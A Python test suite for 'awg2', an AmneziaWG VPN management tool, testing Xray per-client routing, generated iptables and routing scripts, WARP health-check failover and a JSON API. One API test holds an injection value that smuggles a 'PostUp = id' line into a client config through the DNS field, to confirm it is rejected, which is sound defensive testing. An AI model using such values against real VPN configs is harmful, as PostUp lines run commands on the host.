chk("Hysteria2 с salamander — finalmask", rc == 0 and json.loads(out)["streamSettings"]["finalmask"]
    == {"udp": [{"type": "salamander", "settings": {"password": "s3"}}]}, [out, err])

# ── Xray: свой выход клиенту ──
XP = os.path.join(ROOT, "xray.peers")
rc, out, _ = bash(XRAY_ENV + "xray_tags")
XT = out.split()
rc, out, _ = bash('client_create xc1 "" none "1.1.1.1, 1.0.0.1" "" >/dev/null 2>&1; clients_name_ip')
CN = [line.split("|") for line in out.split()]
chk("Xray: для выбора по клиентам — два клиента", len(CN) >= 2, out)
(C1, IP1), (C2, IP2) = CN[0], CN[1]
chk("Xray: для выбора по клиентам — два выхода", len(XT) >= 2, XT)
rc, out, _ = bash(XRAY_ENV + f"xray_client_out {C1} {XT[1]} && cat \"$XRAY_PEERS\"")
chk("свой выход клиенту — строка «IP|выход», остальные на выходе по умолчанию",
    rc == 0 and f"{IP1}|{XT[1]}" in out.split() and IP2 in out.split(), out)
rc, out, _ = bash(XRAY_ENV + '_xray_prepare; python3 -c "import json,sys; print(json.dumps(json.load(open(sys.argv[1]))[\'routing\'][\'rules\']))" "$XRAY_CONF"')
rules = json.loads(out.strip().splitlines()[-1]) if rc == 0 and out.strip() else []
own = [r for r in rules if r.get("ruleTag") == "client-out"]
chk("в конфиге Xray — правило по адресу клиента перед общим",
    own and own[0]["source"] == [IP1] and own[0]["outboundTag"] == XT[1] and own[0]["inboundTag"] == ["tun-in"]
    and rules.index(own[0]) < next(i for i, r in enumerate(rules) if r.get("ruleTag") != "client-out" and r.get("inboundTag")), rules)
rc, out, _ = bash(XRAY_ENV + f"tunnel_client xray all >/dev/null; tunnel_client xray {C1} on >/dev/null; cat \"$XRAY_PEERS\"")
chk("«все клиенты» и включение клиента свой выход не сбрасывают", f"{IP1}|{XT[1]}" in out.split(), out)
rc, out, _ = bash(XRAY_ENV + f"xray_main_set {XT[1]} && py xray-main-get \"$XRAY_CONF\"")
chk("выход по умолчанию", rc == 0 and out.strip().splitlines()[-1] == XT[1], out)
rc, out, _ = bash(XRAY_ENV + f"xray_client_out {C1} nosuch")
chk("неизвестный выход — ошибка", rc != 0 and "Выхода nosuch нет" in out, out)
rc, out, _ = bash(XRAY_ENV + f"XRAY_BIN={fake_xray(tun=False)}; xray_client_out {C2} {XT[0]}")
chk("сборка Xray без inbound tun — свой выход не назначается, с подсказкой", rc != 0 and "обнови xray" in out.lower(), out)
with open(XP) as f:
    xp_saved = f.read()
rc, out, _ = bash(XRAY_ENV + f"xray_del_tag {XT[1]} >/dev/null; cat \"$XRAY_PEERS\"")
chk("удалён выход — его клиенты на выходе по умолчанию", IP1 in out.split() and "|" not in out, out)
with open(XP, "w") as f:
    f.write(xp_saved)
# Свой выход живёт и в конфиге Xray: выкл/вкл клиента без пересборки оставлял
# правило по адресу — клиент шёл через прежний выход, а в списке — «по умолчанию»
rc, out, _ = bash(XRAY_ENV + 'xray_is_up() { true; }; xray_restart() { echo RESTART; }; _tunnel_rules_refresh() { :; }; '
                  f'tunnel_client xray {C1} off; tunnel_client xray {C1} on; cat "$XRAY_PEERS"; '
                  'python3 -c "import json,sys; print(json.dumps(json.load(open(sys.argv[1]))[\'routing\'][\'rules\']))" "$XRAY_CONF"')
rules = json.loads(out.strip().splitlines()[-1]) if out.strip() else []
chk("Xray: выкл/вкл клиента со своим выходом — конфиг пересобран, правило по адресу снято",
    out.count("RESTART") == 1 and IP1 in out.split() and f"{IP1}|" not in out
    and not any(IP1 in (r.get("source") or []) for r in rules), out)
with open(XP, "w") as f:
    f.write("10.0.0.5|t.1\n10.0.0.6|tx1\n10.0.0.7\n10.0.0.8|t2\n")
rc, out, _ = bash(XRAY_ENV + '_xray_peers_untag t.1 t2; cat "$XRAY_PEERS"')
chk("выходы удалены (в т.ч. «Починить конфиг») — их клиенты на выходе по умолчанию, тег не как регулярка",
    out.split() == ["2", "10.0.0.5", "10.0.0.6|tx1", "10.0.0.7", "10.0.0.8"], out)
with open(XP, "w") as f:
    f.write(xp_saved)
# Заблокированный клиент остаётся в списках туннелей под своим адресом
WP = os.path.join(ROOT, "warp.peers.test")
with open(WP, "w") as f:
    f.write(IP2 + "\n")
rc, out, _ = bash(f'py meta-set "$SERVER_CONF" {C2} expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  f'peers_sync "{WP}"; cat "{WP}"; clients_name_ip | grep "^{C2}|"; py expire-clear "$SERVER_CONF" {C2} "$EXPIRE_SUSPEND_IP" >/dev/null')
chk("заблокированный клиент: в списке туннеля и в clients_name_ip — настоящий адрес", out.split() == [IP2, f"{C2}|{IP2}"], out)
os.remove(WP)
# Удаление заблокированного клиента: его настоящий адрес уходит из туннелей
bash('client_create gina "" none "1.1.1.1, 1.0.0.1" "" >/dev/null 2>&1')
rc, out, _ = bash('had=0; [[ -f "$WARP_PEERS" ]] && had=1 && cp "$WARP_PEERS" "$WARP_PEERS.sv"; '
                  'ip=$(clients_name_ip | awk -F"|" \'$1 == "gina" {print $2}\'); echo "$ip" >> "$WARP_PEERS"; '
                  'py meta-set "$SERVER_CONF" gina expires 1; py expire-check "$SERVER_CONF" "$EXPIRE_SUSPEND_IP" "$EXPIRE_STATE_DIR" >/dev/null; '
                  'client_delete "$(client_pub gina)" >/dev/null 2>&1; echo "ip=$ip"; grep -c "^$ip\(|\|$\)" "$WARP_PEERS" || true; '
                  'if (( had )); then mv -f "$WARP_PEERS.sv" "$WARP_PEERS"; else rm -f "$WARP_PEERS"; fi')
gip = re.search(r"ip=(\S+)", out)
chk("удалён заблокированный клиент — его настоящий адрес убран из списка туннеля",
    gip and gip.group(1).startswith("10.") and out.strip().splitlines()[-1] == "0", out)
# Чужой тег входа tun («tun» из правленного руками конфига): общее правило
# переставало узнаваться — дописывалось новое, старое вело в прежний выход
XF = os.path.join(TMP, "xf.json")
with open(XF, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun", "settings": {}}],
               "outbounds": [{"protocol": "vless", "tag": "A"}, {"protocol": "vless", "tag": "B"},
                             {"protocol": "freedom", "tag": "direct"}],
               "routing": {"rules": [{"type": "field", "inboundTag": ["tun"], "outboundTag": "A"}]}}, f)
rc, out, _ = bash(f'py xray-prepare "{XF}" native && py xray-main "{XF}" B && py xray-prepare "{XF}" native && py xray-main-get "{XF}"')
xf = json.load(open(XF))
mains = [r for r in xf["routing"]["rules"] if r.get("inboundTag")]
chk("Xray: чужой тег tun — одно общее правило, выход по умолчанию меняется",
    rc == 0 and out.strip() == "B" and len(mains) == 1 and mains[0] == {"type": "field", "inboundTag": ["tun-in"], "outboundTag": "B"}
    and xf["inbounds"][0]["tag"] == "tun-in", [out, xf])
chk("Xray: у входа tun имя xray0 и в старом конфиге без имени — Xray 26.x иначе называет его utunN",
    xf["inbounds"][0]["settings"].get("name") == "xray0", xf["inbounds"][0])
with open(XF, "w") as f:
    json.dump({"inbounds": [{"protocol": "tun", "tag": "tun-in", "settings": {"name": "utun42", "mtu": 1400}}],
               "outbounds": [{"protocol": "vless", "tag": "A"}]}, f)
rc, out, _ = bash(f'py xray-prepare "{XF}" native')
xf = json.load(open(XF))
chk("Xray: чужое имя устройства — снова xray0, остальные настройки входа на месте",
    rc == 0 and xf["inbounds"][0]["settings"] == {"name": "xray0", "mtu": 1400}, xf["inbounds"][0])
bash("client_remove xc1 >/dev/null 2>&1")

# ── 4. Служебные скрипты ──────────────────────────────────
print("Служебные скрипты")
with open(conf, "w") as f:
    f.write(OLD20)
with open(LINKS, "w") as f:
    f.write("awg0\ntun0\nxray0\nwarp0\nawg-exit-de\nawg-exit-nl\n")
os.makedirs(os.path.join(ROOT, "etc/awg-cascade"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-cascade/rules.conf"), "w") as f:
    f.write("udp|443|5.6.7.8|443|de\ntcp|8443|5.6.7.8|443|\n")
for n in ("de", "nl"):
    open(os.path.join(ROOT, f"etc/amnezia/amneziawg/awg-exit-{n}.conf"), "w").close()
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state"), "w") as f:
    f.write("active\nmode=peers\nbalancer=ecmp\nsingle_exit=\n")
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list"), "w") as f:
    f.write("10.23.45.2|nl\n10.23.45.3\n")
os.makedirs(os.path.join(ROOT, "etc/awg-wgobf"), exist_ok=True)
with open(os.path.join(ROOT, "etc/awg-wgobf/state"), "w") as f:
    f.write("NET=10.77.1.0/24\nWG_PORT=40001\nPORT=40000\n")
with open(os.path.join(TMP, "warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 172.16.0.2/32, 2606::1/128\nMTU = 1280\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")

rc, out, err = bash(f'''
WARP_CONF="{TMP}/warp0.conf"
_dns_emit_helpers && _cascade_persist && _exits_write_unit && expire_install >/dev/null
emit_script "$T2S_ROUTING_SCRIPT" 't2s_routing_run "$@"' T2S_IF T2S_TABLE T2S_ADDR "${{RT_FUNCS[@]}}" t2s_routing_run
_xray_emit_routing
emit_script "$WGOBF_FW" 'wgobf_fw_run "$@"' WGOBF_STATE WGOBF_TAG WGOBF_IF ipt_del_grep ipt_del_tagged wgobf_get wgobf_fw_run
emit_script "$WARP_AUTOSTART_SCRIPT" 'warp_wg_bringup' WARP_CONF WARP_IF WARP_TABLE WARP_PEERS "${{RT_FUNCS[@]}}" warp_awg_params warp_wg_bringup
_warp_health_emit
emit_script "$USQUE_UP_HOOK" 'usque_on_connect' WARP_IF WARP_TABLE WARP_PEERS USQUE_LOG "${{RT_FUNCS[@]}}" usque_on_connect
ls "{ROOT}/scripts"''')
scripts = out.split()
chk("скрипты сгенерированы", rc == 0 and len(scripts) == 11, err + out)
for s in scripts:
    r = subprocess.run(["bash", "-n", os.path.join(ROOT, "scripts", s)], capture_output=True, text=True)
    chk(f"bash -n {s}", r.returncode == 0, r.stderr)

SCR = lambda n: os.path.join(ROOT, "scripts", n)
NOT_FOUND = re.compile(r"command not found|unbound variable")


def run_and_check(label, script, *args, must=(), must_not=()):
    reset_calls()
    rc, out, err = run_script(SCR(script), *args)
    log = calls()
    missing = [m for m in must if not re.search(m, log)]
    present = [m for m in must_not if re.search(m, log)]
    chk(label, not NOT_FOUND.search(err) and not missing and not present,
        f"rc={rc} err={err.strip()[-300:]} нет: {missing} лишнее: {present}")


run_and_check("DNS: перехват и блок DoT в mangle", "DNS_PERSIST_SCRIPT",
              must=[r"-t nat -A PREROUTING -i awg0 -p udp --dport 53 -j DNAT --to-destination 127\.0\.2\.1:53 -m comment --comment awg2-dns",
                    r"-t mangle -A PREROUTING -i awg0 -p tcp --dport 853 -j DROP -m comment --comment awg2-dns",
                    r"-t filter -I INPUT 1 -i awg0 -d 127\.0\.2\.1"])
run_and_check("DNS: health-check", "DNS_HEALTH_SCRIPT", must=[r"-t nat -A PREROUTING"])
run_and_check("Каскад: только адреса сервера, туда и обратно", "CASCADE_SCRIPT",
              must=[r"-t nat -A PREROUTING -p udp --dport 443 -m addrtype --dst-type LOCAL -j DNAT --to-destination 5\.6\.7\.8:443 -m comment --comment awg-cascade:udp-443",
                    r"-I FORWARD 1 -p tcp -s 5\.6\.7\.8 --sport 443 -j ACCEPT -m comment --comment awg-cascade:tcp-8443"])
run_and_check("tun2socks: вся подсеть в таблицу 100", "T2S_ROUTING_SCRIPT", "start",
              must=[r"ip rule add from 10\.23\.45\.0/24 lookup 100 priority 100", r"MASQUERADE -m comment --comment awg2-tun-tun0"])
os.makedirs(os.path.join(ROOT, "etc/xray"), exist_ok=True)
with open(os.path.join(ROOT, "etc/xray/state"), "w") as f:
    f.write("active\ntun_mode=tun2socks\n")
run_and_check("Xray: клиенты из списка в таблицу 201", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip route replace default dev xray0 table 201", r"-A POSTROUTING .* -o xray0 -j MASQUERADE"])
with open(os.path.join(ROOT, "xray.peers.wgobf"), "w") as f:
    f.write("10.77.1.6|A\n")
run_and_check("Xray (tun2socks): клиенты обфускатора в таблицу 201, их NAT не трогаем", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip rule add from 10\.77\.1\.6 lookup 201 priority 201"],
              must_not=[r"-I POSTROUTING 1 -s 10\.77\.1\.0/24 -o xray0 -j RETURN"])
with open(os.path.join(ROOT, "etc/xray/state"), "w") as f:
    f.write("active\ntun_mode=native\n")
run_and_check("Xray с inbound tun: без NAT — Xray видит адрес клиента (и клиента обфускатора)", "XRAY_ROUTING_SCRIPT", "start",
              must=[r"ip route replace default dev xray0 table 201", r"-D POSTROUTING .* -o xray0 -j MASQUERADE",
                    r"ip rule add from 10\.77\.1\.6 lookup 201 priority 201",
                    r"-t nat -I POSTROUTING 1 -s 10\.77\.1\.0/24 -o xray0 -j RETURN -m comment --comment awg2-tun-xray0"],
              must_not=[r"-A POSTROUTING .* -o xray0 -j MASQUERADE"])
os.remove(os.path.join(ROOT, "etc/xray/state"))
os.remove(os.path.join(ROOT, "xray.peers.wgobf"))
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list.wgobf"), "w") as f:
    f.write("10.77.1.7|nl\n10.77.1.8\n10.77.1.9|gone\n")
run_and_check("Exit-ноды: ECMP и персональная нода (и у клиентов обфускатора)", "EXITS_SCRIPT", "start",
              must=[r"nexthop dev awg-exit-de weight 1 nexthop dev awg-exit-nl weight 1",
                    r"ip route replace default dev awg-exit-nl table 211",
                    r"ip rule add from 10\.23\.45\.2 lookup 211 priority 202",
                    r"ip rule add from 10\.23\.45\.3 lookup 202 priority 202",
                    r"ip rule add from 10\.77\.1\.7 lookup 211 priority 202",
                    r"ip rule add from 10\.77\.1\.8 lookup 202 priority 202",
                    r"ip rule add from 10\.77\.1\.9 lookup 202 priority 202"])
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state"), "w") as f:
    f.write("active\nmode=all\nbalancer=ecmp\nsingle_exit=\n")
run_and_check("Exit-ноды «все клиенты AWG»: подсеть awg0 целиком, клиенты обфускатора — своим списком", "EXITS_SCRIPT", "start",
              must=[r"ip rule add from 10\.23\.45\.0/24 lookup 202 priority 202",
                    r"ip rule add from 10\.77\.1\.7 lookup 211 priority 202",
                    r"ip rule add from 10\.77\.1\.8 lookup 202 priority 202"],
              must_not=[r"from 10\.23\.45\.2 lookup"])
with open(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_state"), "w") as f:
    f.write("active\nmode=peers\nbalancer=ecmp\nsingle_exit=\n")
os.remove(os.path.join(ROOT, "etc/amnezia/amneziawg/exits_peers.list.wgobf"))
run_and_check("Exit-ноды: остановка", "EXITS_SCRIPT", "stop", must_not=[r"-A "])
# Клиенты WG + обфускатора в WARP: список «.wgobf» рядом со списком WARP читает тот же rt_up
rc, out, _ = bash('echo 10.23.45.2 > "$WARP_PEERS"; printf "10.77.1.5\\n" > "$WARP_PEERS.wgobf"; echo "$WARP_PEERS"')
run_and_check("WARP (хук usque): клиенты AWG и обфускатора — в таблицу 200, MSS и для wgobf0", "USQUE_UP_HOOK",
              must=[r"ip rule add from 10\.23\.45\.2 lookup 200 priority 200",
                    r"ip rule add from 10\.77\.1\.5 lookup 200 priority 200",
                    r"-i warp0 -o wgobf0 -p tcp .*TCPMSS"])
bash('rm -f "$WARP_PEERS" "$WARP_PEERS.wgobf"')
run_and_check("WG+обфускатор: правила по метке", "WGOBF_FW", "up",
              must=[r"-I INPUT 1 -p udp --dport 40001 ! -i lo -j DROP -m comment --comment awg-wgobf",
                    r"-t nat -A POSTROUTING -s 10\.77\.1\.0/24 ! -o wgobf0 -j MASQUERADE"])
run_and_check("usque on-connect", "USQUE_UP_HOOK", must=[r"table 200"])
run_and_check("Сроки клиентов", "EXPIRE_BIN", must=[r"awg-quick strip awg0"])
with open(conf) as f:
    chk("истёкший клиент заблокирован скриптом таймера", "AllowedIPs = 127.0.0.2/32" in f.read())
with open(LINKS, "w") as f:
    f.write("awg0\n")
run_and_check("WARP: подъём warp0 только с IPv4", "WARP_AUTOSTART_SCRIPT",
              must=[r"ip link add dev warp0 type wireguard", r"(?m)^wg setconf warp0", r"ip -4 addr add 172\.16\.0\.2/32 dev warp0",
                    r"ip route replace default dev warp0 src 172\.16\.0\.2 table 200"],
              must_not=[r"2606::1", r"awg setconf", r"type amneziawg"])
# Профиль «WARP для России» с параметрами AmneziaWG: чистый WireGuard к Cloudflare
# оттуда режут, поэтому warp0 — amneziawg, и параметры уходят в awg setconf
with open(os.path.join(TMP, "warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nJc = 4\nJmin = 40\nJmax = 70\nS1 = 0\nS2 = 0\nH1 = 1\nH2 = 2\nH3 = 3\nH4 = 4\n"
            "I1 = <b 0xc2000000011419fa>\r\nAddress = 172.16.0.2/32\nMTU = 1280\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")
run_and_check("WARP: профиль с параметрами AmneziaWG — warp0 поднимается через AmneziaWG", "WARP_AUTOSTART_SCRIPT",
              must=[r"ip link add dev warp0 type amneziawg", r"awg setconf warp0", r"ip -4 addr add 172\.16\.0\.2/32 dev warp0"],
              must_not=[r"type wireguard", r"(?m)^wg setconf warp0"])
rc, out, _ = bash(f'WARP_CONF="{TMP}/warp0.conf"; warp_awg_params')
chk("WARP: параметры AmneziaWG из профиля — все и без \\r, ключи и адреса не попадают",
    out.splitlines() == ["Jc = 4", "Jmin = 40", "Jmax = 70", "S1 = 0", "S2 = 0", "H1 = 1", "H2 = 2", "H3 = 3", "H4 = 4",
                         "I1 = <b 0xc2000000011419fa>"], out)
rc, out, _ = bash('mkdir -p "$(dirname "$WARP_STATE")"; touch "$WARP_STATE"; warp_failed && echo F; '
                  'echo warp0 >> "$LINKS"; warp_failed || echo U; sed -i "/^warp0$/d" "$LINKS"; '
                  'rm -f "$WARP_STATE"; warp_failed || echo OFF')
chk("WARP: «упал» — включён, а warp0 нет; поднят или выключен руками — не сбой", out.split() == ["F", "U", "OFF"], out)
rc, out, _ = bash('ip() { [[ "$*" == "-d link show warp0" ]] && echo "5: warp0: <POINTOPOINT> amneziawg"; }; warp_tool; '
                  'ip() { echo "5: warp0: <POINTOPOINT> wireguard"; }; warp_tool')
chk("WARP: с warp0 из профиля AWG говорим через awg, с обычным — через wg", out.split() == ["awg", "wg"], out)
with open(os.path.join(TMP, "warp0.conf"), "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 172.16.0.2/32, 2606::1/128\nMTU = 1280\n[Peer]\nPublicKey = Q\nEndpoint = 162.159.192.1:2408\n")

# Health-check WARP: заглушки ping (HC_PING — файл: есть — Cloudflare отвечает) и
# ip с состоянием warp0 (link add/del — в LINKS) и маршрута таблицы 200 (файл HC_RT)
HCBIN = os.path.join(TMP, "hcbin")
os.makedirs(HCBIN, exist_ok=True)
HC_PING, HC_RT = os.path.join(TMP, "hc-ping-ok"), os.path.join(TMP, "hc-rt")
HC_STUBS = {
    "ping": r"""echo "ping $*" >> "$CALLS"; [[ -f "$HC_PING" ]]""",
    "ip": r"""case "$*" in
  "link add dev warp0"*) echo warp0 >> "$LINKS" ;;
  "link del warp0") sed -i "/^warp0$/d" "$LINKS" ;;
  "-4 -o addr show dev warp0") echo "ip $*" >> "$CALLS"; echo "9: warp0    inet 172.16.0.2/32 scope global warp0"; exit 0 ;;
  "route show table 200") echo "ip $*" >> "$CALLS"; [[ -f "$HC_RT" ]] && echo "default dev warp0 scope link"; exit 0 ;;
  "route replace default dev warp0"*"table 200") touch "$HC_RT" ;;
  "route flush table 200") rm -f "$HC_RT" ;;
esac
PATH="${PATH#"${0%/*}:"}" exec ip "$@"
""",
}
for name, body in HC_STUBS.items():
    with open(os.path.join(HCBIN, name), "w") as f:
        f.write("#!/usr/bin/env bash\n" + body + "\n")
    os.chmod(os.path.join(HCBIN, name), 0o755)
HCPRE = f'export PATH="{HCBIN}:$PATH" HC_PING="{HC_PING}" HC_RT="{HC_RT}"; '
HCF = {k: os.path.join(ROOT, n) for k, n in (("fails", "warp-fails"), ("retry", "warp-retry"), ("log", "warp-health.log"))}


def hc_run(ping_ok, n=1):
    if ping_ok:
        open(HC_PING, "w").close()
    elif os.path.exists(HC_PING):
        os.remove(HC_PING)
    reset_calls()
    for _ in range(n):
        bash(HCPRE + 'bash "$WARP_HEALTH_SCRIPT"')
    return calls()


def hc_read(k):
    try:
        return open(HCF[k]).read().strip()
    except OSError:
        return None


rc, out, err = bash(f'WARP_CONF="{TMP}/warp0.conf"; _warp_health_emit; mkdir -p "$(dirname "$WARP_STATE")"; '
                    'touch "$WARP_STATE"; rm -f "$WARP_STATE.failed" "$WARP_BACKEND_FILE"; echo "$WARP_STATE"')
WSTATE = out.strip()
with open(LINKS, "w") as f:
    f.write("awg0\nwarp0\n")
open(HC_RT, "w").close()
log = hc_run(True)
chk("health-check: WARP отвечает — счётчик в ноль, ничего не трогает",
    rc == 0 and hc_read("fails") == "0" and "link del" not in log and "-I warp0 1.1.1.1" in log, [err, log])
log = hc_run(False, 2)
chk("два провала подряд — только счёт, клиенты в туннеле",
    hc_read("fails") == "2" and "link del" not in log and not os.path.exists(WSTATE + ".failed"), log)
log = hc_run(False)
chk("третий провал — клиенты напрямую: маршруты сняты, warp0 убран, WARP остаётся включённым с меткой",
    "ip link del warp0" in log and "route flush table 200" in log and os.path.exists(WSTATE)
    and os.path.exists(WSTATE + ".failed") and "FAILOVER" in (open(HCF["log"]).read()), log)
log = hc_run(False)
chk("после отказа — пробует вернуть WARP без клиентов: warp0 поднят и убран, маршрутов клиентов нет",
    "ip link add dev warp0" in log and "ip link del warp0" in log and "route replace default dev warp0" not in log
    and "lookup 200" not in log.replace("ip rule del lookup 200", "") and hc_read("retry") == "1"
    and os.path.exists(WSTATE + ".failed") and "RETRY 1" in open(HCF["log"]).read(), log)
hc_run(False, 9)
log = hc_run(False)
chk("первые 10 попыток — каждую минуту, дальше — раз в 5 минут (11-я пропущена)",
    hc_read("retry") == "11" and "link add" not in log, [hc_read("retry"), log])
hc_run(False, 3)
log = hc_run(False)
chk("15-я — снова попытка: и через час пробует, пока не выключат", hc_read("retry") == "15" and "ip link add dev warp0" in log,
    [hc_read("retry"), log])
with open(os.path.join(ROOT, "warp-retry"), "w") as f:
    f.write("19")
with open(LINKS, "a") as f:
    f.write("xray0\n")
log = hc_run(True)
chk("пока WARP лежал, включили Xray — WARP не возвращает, чтобы не мешать",
    "link add" not in log and os.path.exists(WSTATE + ".failed"), log)
with open(LINKS, "w") as f:
    f.write("awg0\n")
with open(os.path.join(ROOT, "warp-retry"), "w") as f:
    f.write("19")
log = hc_run(True)
chk("Cloudflare ответил — WARP вернулся: маршруты клиентов с адресом warp0, метка и счётчики сброшены",
    "ip link add dev warp0" in log and "ip route replace default dev warp0 src 172.16.0.2 table 200" in log
    and "ip link del" not in log and not os.path.exists(WSTATE + ".failed") and hc_read("retry") is None
    and hc_read("fails") == "0" and "RECOVERED" in open(HCF["log"]).read(), log)
os.remove(HC_RT)
log = hc_run(True)
chk("warp0 есть, а маршрутов клиентов нет (попытку прервали) — доставляет их",
    "ip route replace default dev warp0 src 172.16.0.2 table 200" in log, log)
with open(LINKS, "w") as f:
    f.write("awg0\n")
os.remove(WSTATE)
log = hc_run(True)
chk("WARP выключен руками — health-check его не поднимает", "link add" not in log and "route replace" not in log, log)
bash('rm -f "$WARP_STATE.failed"')

# ── 5. Разбор iptables-save ───────────────────────────────
print("iptables-save")
with open(IPT_SAVE, "w") as f:
    f.write('-A PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment "awg-cascade:udp-443" -j DNAT --to-destination 5.6.7.8:443\n'
            '-A PREROUTING -p udp -m udp --dport 4430 -m comment --comment "awg-cascade:udp-4430" -j DNAT --to-destination 5.6.7.8:4430\n'
            '-A POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE\n')
reset_calls()
bash("cascade_unapply udp 443")
log = calls()
chk("правило с комментарием в кавычках удаляется, соседнее — нет",
    "-D PREROUTING -p udp -m udp --dport 443 -m addrtype --dst-type LOCAL -m comment --comment awg-cascade:udp-443 -j DNAT" in log
    and "4430" not in log, log)
reset_calls()
bash("rt_fw_down tun0")
chk("метка туннеля", "-t nat -D POSTROUTING -s 10.0.0.0/24 -o tun0 -m comment --comment awg2-tun-tun0 -j MASQUERADE" in calls(), calls())

# ── 6. CLI без root ───────────────────────────────────────
print("CLI")
r = subprocess.run(["bash", AWG2, "--version"], capture_output=True, text=True)
chk("--version", r.returncode == 0 and r.stdout.startswith("awg2 v"), r.stdout + r.stderr)
r = subprocess.run(["bash", AWG2, "--help"], capture_output=True, text=True)
chk("--help", r.returncode == 0 and "--tunnel" in r.stdout and "--wgobf" in r.stdout, r.stderr)
head = open(AWG2, encoding="utf-8").read(4096)
chk("VERSION в первых 4 КБ (самообновление и бот)", re.search(r'^VERSION="v\d+\.\d+\.\d+"$', head, re.M) is not None)

# ── 7. Машинный API (awg2 api) ────────────────────────────
print("API")
API_WRAP = api_wrapper()
with open(conf, "w") as f:
    f.write(OLD20)
for n in ("alice", "bob"):
    with open(os.path.join(ROOT, "root", n + "_awg2.conf"), "w") as f:
        f.write("[Interface]\nPrivateKey = X\n")


def api(*args, stdin=None, env=None):
    # stdin — открытый пайп: API обязан не ждать его без нужды
    r = subprocess.run([API_WRAP, *args], input=stdin, capture_output=True, text=True,
                       env=dict(ENV, **(env or {})), timeout=120)
    lines = r.stdout.strip().splitlines()
    try:
        res = json.loads(lines[-1]) if len(lines) == 1 else {"raw": r.stdout}
    except ValueError:
        res = {"raw": r.stdout}
    res["_rc"] = r.returncode
    res["_err"] = r.stderr
    return res


r = api("version")
chk("api version — одна строка JSON", r.get("ok") is True and r["data"]["version"].startswith("v")
    and r["data"]["api"] == 1, r)
SLOW = os.path.join(TMP, "slowbin")
os.makedirs(SLOW)
with open(os.path.join(SLOW, "curl"), "w") as f:
    f.write("#!/usr/bin/env bash\nsleep 6\nexit 1\n")
os.chmod(os.path.join(SLOW, "curl"), 0o755)
t0 = time.time()
r = api("status", env={"PATH": SLOW + ":" + ENV["PATH"]})
chk("фоновая проверка обновлений не держит ответ", r.get("ok") and time.time() - t0 < 5, time.time() - t0)
d = r.get("data") or {}
chk("api status", r.get("ok") and d["server"]["exists"] and d["server"]["clients"] == 2
    and d["server"]["proto"] == "2.0" and d["tunnels"]["warp"] == "none", r)
open(CALLS, "w").close()
r = api("status")
with open(CALLS) as f:
    n = sum(1 for ln in f if ln.startswith("ip -4 -o addr show"))
chk("api status: адрес сервера узнаётся один раз (не в каждой подоболочке)", r.get("ok") and n == 1, n)
r = api("tunnels", "status")
chk("api tunnels status — счётчики интерфейсов туннелей (поднятых нет — пусто)",
    r.get("ok") and (r.get("data") or {}).get("ifs") == [], r)
r = api("warp", "status")
d = r.get("data") or {}
chk("api warp status — интерфейс и счётчики для карточки",
    r.get("ok") and d.get("iface") == "warp0" and d.get("rx") == 0 and d.get("hs") == 0 and "endpoint" in d, r)
r = api("clients", "list")
rows = r.get("data") or []
chk("api clients list", [c["name"] for c in rows] == ["alice", "bob"] and rows[0]["ip"] == "10.23.45.2"
    and rows[0]["file"].endswith("alice_awg2.conf") and rows[1]["expires"] == 1 and rows[0]["warp"] is None, r)
r = api("client", "add", "carol", "expire=+1d", "mimicry=none")
d = r.get("data") or {}
chk("api client add", r.get("ok") and d.get("name") == "carol" and "[Interface]" in d.get("text", ""), r)
r = api("client", "add", "carol", "mimicry=none")
chk("занятое имя — ошибка с текстом", r.get("ok") is False and r["rc"] == 1 and "carol" in r["error"], r)
r = api("client", "add", "dnsbad", "mimicry=none", "dns=1.1.1.1\nPostUp = id")
chk("api client add: DNS с переводом строки — отказ, конфиг не создан",
    r.get("ok") is False and "dns" in r.get("error", "")
    and not os.path.exists(os.path.join(ROOT, "root", "dnsbad_awg2.conf")), r)
rows = api("clients", "list").get("data") or []
carol = next((c for c in rows if c["name"] == "carol"), {})
chk("срок клиента", carol.get("expires", 0) > 1e9 and carol.get("mimicry") == "none", carol)
r = api("client", "rename", "carol", "dave")
chk("api client rename", r.get("ok") and os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("client", "del", "dave")
chk("api client del", r.get("ok") and not os.path.exists(os.path.join(ROOT, "root", "dave_awg2.conf")), r)
r = api("clients", "bulk", "t:3", "mimicry=none")
chk("api clients bulk", r.get("ok") and r["data"] == ["t-001", "t-002", "t-003"], r)
api("clients", "bulk", "z:2", "mimicry=none")
r = api("clients", "bulk", "past:2", "expire=2020-01-01", "mimicry=none")
chk("bulk: срок в прошлом отвергается", r.get("ok") is False and "прошёл" in (r.get("error") or "")
    and not any(c["name"].startswith("past-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "z-001, z-002,nobody")
chk("api clients del — несколько, неизвестные пропускаются",
    r.get("ok") and r["data"] == ["z-001", "z-002"] and "Нет клиента: nobody" in r.get("log", "")
    and not os.path.exists(os.path.join(ROOT, "root", "z-001_awg2.conf"))
    and not any(c["name"].startswith("z-") for c in api("clients", "list").get("data") or []), r)
r = api("clients", "del", "nobody")
chk("api clients del — никого не нашёл: ошибка", not r.get("ok") and r.get("data") == [], r)
r = api("tunnels", "clients", "warp")
chk("клиенты туннеля без списка — все", r.get("ok") and len(r["data"]) == 5 and all(c["on"] for c in r["data"]), r)
api("tunnels", "client", "warp", "none")
r = api("tunnels", "client", "warp", "alice", "on")
rows = api("tunnels", "clients", "warp").get("data") or []
chk("выбор клиентов туннеля", [c["name"] for c in rows if c["on"]] == ["alice"], rows)
